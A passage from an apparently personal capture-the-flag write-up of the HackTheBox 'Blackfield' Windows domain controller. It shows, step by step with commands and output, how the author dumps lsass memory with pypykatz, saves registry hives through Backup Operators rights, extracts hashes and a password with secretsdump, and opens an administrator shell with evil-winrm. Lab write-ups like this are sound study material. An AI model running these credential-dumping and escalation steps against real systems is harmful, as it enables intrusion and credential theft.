<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbclient -dc-ip 10.10.10.192 &#x27;blackfield.local/audit2020:Password123@blackfield.local&#x27;</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># use forensic</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Sun Feb 23 09:10:16 2020 .</span><br><span class="line">drw-rw-rw-          0  Sun Feb 23 09:10:16 2020 ..</span><br><span class="line">drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 commands_output</span><br><span class="line">drw-rw-rw-          0  Thu May 28 15:29:24 2020 memory_analysis</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 tools</span><br></pre></td></tr></table></figure>
<p>This looks like a dump of some sort from the DC based on the tools and commands_output directory.</p>
<p>Tools Directory:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 .</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 ..</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:34 2020 sleuthkit-4.8.0-win32</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:35 2020 sysinternals</span><br><span class="line">drw-rw-rw-          0  Fri Feb 28 16:30:35 2020 volatility</span><br></pre></td></tr></table></figure>
<p>Commands_output Directory:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 .</span><br><span class="line">drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 ..</span><br><span class="line">-rw-rw-rw-        528  Sun Feb 23 12:12:54 2020 domain_admins.txt</span><br><span class="line">-rw-rw-rw-        962  Sun Feb 23 12:12:54 2020 domain_groups.txt</span><br><span class="line">-rw-rw-rw-      16454  Fri Feb 28 16:32:17 2020 domain_users.txt</span><br><span class="line">-rw-rw-rw-     518202  Sun Feb 23 12:12:54 2020 firewall_rules.txt</span><br><span class="line">-rw-rw-rw-       1782  Sun Feb 23 12:12:54 2020 ipconfig.txt</span><br><span class="line">-rw-rw-rw-       3842  Sun Feb 23 12:12:54 2020 netstat.txt</span><br><span class="line">-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt</span><br><span class="line">-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt</span><br><span class="line">-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt</span><br></pre></td></tr></table></figure>
<p>Memory_analysis Directory:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">     3842  Sun Feb 23 12:12:54 2020 netstat.txt</span><br><span class="line">-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt</span><br><span class="line">-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt</span><br><span class="line">-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt</span><br><span class="line"># cd ../memory_analysis</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Thu May 28 15:29:24 2020 .</span><br><span class="line">drw-rw-rw-          0  Thu May 28 15:29:24 2020 ..</span><br><span class="line">-rw-rw-rw-   37876530  Thu May 28 15:29:24 2020 conhost.zip</span><br><span class="line">-rw-rw-rw-   24962333  Thu May 28 15:29:24 2020 ctfmon.zip</span><br><span class="line">-rw-rw-rw-   23993305  Thu May 28 15:29:24 2020 dfsrs.zip</span><br><span class="line">-rw-rw-rw-   18366396  Thu May 28 15:29:24 2020 dllhost.zip</span><br><span class="line">-rw-rw-rw-    8810157  Thu May 28 15:29:24 2020 ismserv.zip</span><br><span class="line">-rw-rw-rw-   41936098  Thu May 28 15:29:24 2020 lsass.zip</span><br><span class="line">-rw-rw-rw-   64288607  Thu May 28 15:29:24 2020 mmc.zip</span><br><span class="line">-rw-rw-rw-   13332174  Thu May 28 15:29:24 2020 RuntimeBroker.zip</span><br><span class="line">-rw-rw-rw-  131983313  Thu May 28 15:29:24 2020 ServerManager.zip</span><br><span class="line">-rw-rw-rw-   33141744  Thu May 28 15:29:24 2020 sihost.zip</span><br><span class="line">-rw-rw-rw-   33756344  Thu May 28 15:29:24 2020 smartscreen.zip</span><br><span class="line">-rw-rw-rw-   14408833  Thu May 28 15:29:24 2020 svchost.zip</span><br><span class="line">-rw-rw-rw-   34631412  Thu May 28 15:29:24 2020 taskhostw.zip</span><br><span class="line">-rw-rw-rw-   14255089  Thu May 28 15:29:24 2020 winlogon.zip</span><br><span class="line">-rw-rw-rw-    4067425  Thu May 28 15:29:24 2020 wlms.zip</span><br><span class="line">-rw-rw-rw-   18303252  Thu May 28 15:29:24 2020 WmiPrvSE.zip</span><br></pre></td></tr></table></figure>
<p>The <code>lsass.zip</code> caught my eye so I downloaded that to my machine and unziped it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ unzip lsass.zip</span><br><span class="line">Archive:  lsass.zip</span><br><span class="line">  inflating: lsass.DMP</span><br><span class="line">$ file lsass.DMP</span><br><span class="line">lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type</span><br></pre></td></tr></table></figure>
<p>So we have a dump. We can use a python3 module <code>pypykatz</code> to dump this. This dumps everything including <code>svc_backup</code>‘s hash.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pypykatz lsa minidump lsass.DMP</span><br><span class="line">INFO:pypykatz:Parsing file lsass.DMP</span><br><span class="line">FILE: ======== lsass.DMP =======</span><br><span class="line">== LogonSession ==</span><br><span class="line">authentication_id 406458 (633ba)</span><br><span class="line">session_id 2</span><br><span class="line">username svc_backup</span><br><span class="line">domainname BLACKFIELD</span><br><span class="line">logon_server DC01</span><br><span class="line">logon_time 2020-02-23T18:00:03.423728+00:00</span><br><span class="line">sid S-1-5-21-4194615774-2175524697-3563712290-1413</span><br><span class="line">luid 406458</span><br><span class="line">	== MSV ==</span><br><span class="line">		Username: svc_backup</span><br><span class="line">		Domain: BLACKFIELD</span><br><span class="line">		LM: NA</span><br><span class="line">		NT: 9658d1d1dcd9250115e2205d9f48400d</span><br><span class="line">		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span><br><span class="line">		DPAPI: a03cd8e9d30171f3cfe8caad92fef621</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Shell-as-svc-backup"><a href="#Shell-as-svc-backup" class="headerlink" title="Shell as svc_backup"></a>Shell as svc_backup</h2><p>Getting on the box and seeing what privileges we have.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /all</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID          Attributes</span><br><span class="line">========================================== ================ ============ ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>So where part of <code>BackupOperators</code>. Shouldn’t be too hard. Lets backup the SAM,SYSTEM,and SECURITY.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\sam SAM.save</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system SYSTEM.save</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\security SECURITY.save</span><br><span class="line">reg.exe : ERROR: Access is denied.</span><br><span class="line">    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br></pre></td></tr></table></figure>
<p>Hmmm….can’t backup the <code>SECURITY</code> locally, lets try remotely.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ reg.py &#x27;blackfield.local&#x27;/&#x27;svc_backup&#x27;@&#x27;10.10.10.192&#x27; -hashes :9658d1d1dcd9250115e2205d9f48400d save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;C:\Users\svc_backup\Documents\&#x27;</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...</span><br><span class="line">[*] Saved HKLM\SECURITY to C:\Users\svc_backup\Documents\\SECURITY.save</span><br></pre></td></tr></table></figure>
<p>Now we can download them on to our machine and dump the secrets.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\svc_backup\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        2/28/2025   3:54 PM          45056 SAM.save</span><br><span class="line">-a----        2/28/2025   6:02 PM          32768 SECURITY.save</span><br><span class="line">-a----        2/28/2025   3:54 PM       17371136 SYSTEM.save</span><br></pre></td></tr></table></figure>

<p><img src="/img/toomanysecrets.gif" alt="All the SECRETS!!!"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#x27;t have hash information.</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC</span><br><span class="line">$MACHINE.ACC:plain_password_hex:d4e585bbead514b3daca1edf57230a5c7c80a4b1119606b8a0877deb80ec92307304694d473f55ec1bf0e6bf2367e5e730fe56ca92e7fc3525c6dbef85c27aeccecf8e8d49a67fd1b4bf8405acbd94cfc21150a7bee763072734814c6f9ad49cea3aeaee98bbfe3b6315381ba710ec7b37d6352161200c93c065408b4edae5cd06ed1dd8113354ebb55a9113134b697fe276052fd8a7595fe7f9576515d689864b3604b886653dde8e5bcf7efb320cfcf459cb25d740e290f16c3f697e330efd380b0c0eab662ce57fb00e0b521b315918d4b23a335b4683208a712e60443503c68f6f7def869ecae241af356d7f0434</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b4a3d0f8e993f12615a11719a95943f1</span><br><span class="line">[*] DefaultPassword</span><br><span class="line">(Unknown User):###_ADM1N_3920_###</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690</span><br><span class="line">dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f</span><br><span class="line">[*] NL$KM</span><br><span class="line"> 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.</span><br><span class="line"> 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP</span><br><span class="line"> 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t</span><br><span class="line"> 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o</span><br><span class="line">NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
<h2 id="Shell-as-Administrator"><a href="#Shell-as-Administrator" class="headerlink" title="Shell as Administrator"></a>Shell as Administrator</h2><p>Finally, we are administrator on the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i blackfield.local -u Administrator -p &#x27;###_ADM1N_3920_###&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostname</span><br><span class="line">blackfield\administrator</span><br><span class="line">DC01</span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SMB/">SMB</a><a class="post-meta__tags" href="/tags/ASREPRoasting/">ASREPRoasting</a><a class="post-meta__tags" href="/tags/Hashcat/">Hashcat</a><a class="post-meta__tags" href="/tags/pypykatz/">pypykatz</a><a class="post-meta__tags" href="/tags/BackupOperators/">BackupOperators</a></div><div class="post-share"><div class="social-share" data-image="/img/blackfield.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)"><img class="cover" src="/img/cascade.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Cascade (Windows Medium)</div></div><div class="info-2"><div class="info-item-1">Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson, which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for s.smith. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the ArkSvc account. This account belongs to the AD Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.  Initial Nmap1234567891011121314151617181920PORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows...</div></div></div></a><a class="pagination-related" href="/2024/12/21/Data/" title="Data (Linux Easy)"><img class="cover" src="/img/data.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Data (Linux Easy)</div></div><div class="info-2"><div class="info-item-1">Data starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil grafana.ini and grafana.db. Having these we can use a python script to convert this data and hashes to sha256 for hashcat. This gets us on the box as boris. Looking at his privileges we can execute docker exec. To get root privileges on the docker container we can run sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash. From here we can see the filesystem df -h and since we’re root we can mkdir /tmp/pwnd and mount /dev/xXxXx /mnt/pwnd. This lets us read, write, and execute on host filesystem outside the container. Initial Nmap123PORT     STATE SERVICE REASON         VERSION                                                 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)3000/tcp open  ppp?    syn-ack ttl 62        HTTP (Port 3000 - Grafana)Going to this shows a login page with...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">Ethical Hacker | CTF Player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #24292e;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fab fa-htb" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I do writesup for myself, but you can see them too.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">2.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KERBEROS"><span class="toc-number">3.</span> <span class="toc-text">KERBEROS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound"><span class="toc-number">4.</span> <span class="toc-text">BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Round-2"><span class="toc-number">5.</span> <span class="toc-text">SMB Round 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-svc-backup"><span class="toc-number">6.</span> <span class="toc-text">Shell as svc_backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Administrator"><span class="toc-number">7.</span> <span class="toc-text">Shell as Administrator</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/Retro2/" title="Retro2 (Windows Easy)"><img src="/img/retro2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Retro2 (Windows Easy)"/></a><div class="content"><a class="title" href="/2025/04/05/Retro2/" title="Retro2 (Windows Easy)">Retro2 (Windows Easy)</a><time datetime="2025-04-05T17:02:02.000Z" title="Created 2025-04-05 12:02:02">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)"><img src="/img/scrambled.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Scrambled (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)">Scrambled (Windows Medium)</a><time datetime="2025-04-01T14:14:37.000Z" title="Created 2025-04-01 09:14:37">2025-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/28/Breach/" title="Breach (Windows Medium)"><img src="/img/breach.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Breach (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/03/28/Breach/" title="Breach (Windows Medium)">Breach (Windows Medium)</a><time datetime="2025-03-28T16:42:53.000Z" title="Created 2025-03-28 11:42:53">2025-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)"><img src="/img/cypher.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cypher (Linux Medium)"/></a><div class="content"><a class="title" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)">Cypher (Linux Medium)</a><time datetime="2025-03-14T15:13:45.000Z" title="Created 2025-03-14 10:13:45">2025-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)"><img src="/img/cascade.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cascade (Windows Medium)"/></a><div class="content"><a class="title" href="/2025/03/05/Cascade/" title="Cascade (Windows Medium)">Cascade (Windows Medium)</a><time datetime="2025-03-05T20:03:31.000Z" title="Created 2025-03-05 14:03:31">2025-03-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="H4CK,TH3,PL4N3T" data-fontsize="21px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>